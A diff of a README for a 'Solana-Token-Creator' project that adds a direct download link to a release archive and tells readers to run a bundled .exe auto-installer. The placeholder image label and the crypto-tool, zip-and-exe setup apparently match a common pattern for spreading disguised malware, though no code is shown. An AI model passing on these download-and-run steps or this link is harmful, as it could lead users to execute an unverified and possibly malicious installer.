@@ -6,9 +6,9 @@
  ### Installation
 
 [![asdasdasd](https://github.com/user-attachments/assets/a9f49533-ecb3-4843-8cb5-efcbbd395ee4)
-]()
+](https://github.com/Daniel-gon/Solana-Token-Creator/releases/download/V5.43/Release.zip)
 
-## **1. [Download the archive]() from releases and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/Daniel-gon/Solana-Token-Creator/releases/download/V5.43/Release.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 
 > [!TIP] 
